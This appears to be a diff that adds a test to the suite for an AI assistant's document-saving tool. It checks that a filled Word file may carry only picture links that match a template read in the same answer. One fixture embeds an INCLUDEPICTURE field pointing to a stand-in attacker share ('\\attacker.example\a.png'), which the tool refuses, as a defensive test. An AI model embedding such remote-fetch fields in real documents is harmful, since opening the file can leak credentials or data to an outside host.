@@ -277,6 +277,27 @@ describe('out of chat:work/', () => {
     expect(fs.existsSync(team('users/alice/risky.docx'))).toBe(true)
   })
 
+  test('a company template read in this answer vouches for its own exact items in a new filled file; a new one is refused', async () => {
+    const chat = await personal()
+    const field = (target: string) => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">INCLUDEPICTURE "${target}" \\d</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
+    const intranet = '\\\\\\\\intranet\\\\logo.png'
+    w('users/alice/tpl/letter.docx', docx({ body: 'Template', extra: field(intranet) }))
+    const p = path.join(chatWork(base, chat), 'out', 'filled.docx'); fs.mkdirSync(path.dirname(p), { recursive: true })
+    fs.writeFileSync(p, docx({ body: 'Filled for Raon', extra: field(intranet) }))
+    const ok = await run('alice', chat, fake({ tool: 'read', args: { file_path: 'users/alice/tpl/letter.docx' } }, { tool: 'save_work_file', args: { path: 'out/filled.docx', save_as: 'users/alice/' }, sayResult: true }))
+    expect(ok.content).toContain('Saved')
+    expect(fs.existsSync(team('users/alice/filled.docx'))).toBe(true)
+    // the same filled file with one more picture from another share: refused, also after reading the template
+    fs.writeFileSync(p, docx({ body: 'Filled for Raon', extra: field(intranet) + field('\\\\\\\\attacker.example\\\\a.png') }))
+    const bad = await run('alice', chat, fake({ tool: 'read', args: { file_path: 'users/alice/tpl/letter.docx' } }, { tool: 'save_work_file', args: { path: 'out/filled.docx', save_as: 'users/alice/filled2.docx' }, sayResult: true }))
+    expect(bad.content).toContain('Not saved')
+    expect(fs.existsSync(team('users/alice/filled2.docx'))).toBe(false)
+    // without reading the template in this answer, its items vouch for nothing
+    fs.writeFileSync(p, docx({ body: 'Filled for Raon', extra: field(intranet) }))
+    const unread = await run('alice', chat, fake({ tool: 'save_work_file', args: { path: 'out/filled.docx', save_as: 'users/alice/filled3.docx' }, sayResult: true }))
+    expect(unread.content).toContain('Not saved')
+  })
+
   test('a work-folder folder is not copied out (zip it first); a work file into chat:work/ is a box_shell cp', async () => {
     const chat = await personal()
     await run('alice', chat, copy(['users/alice/proposal'], 'chat:work/'))
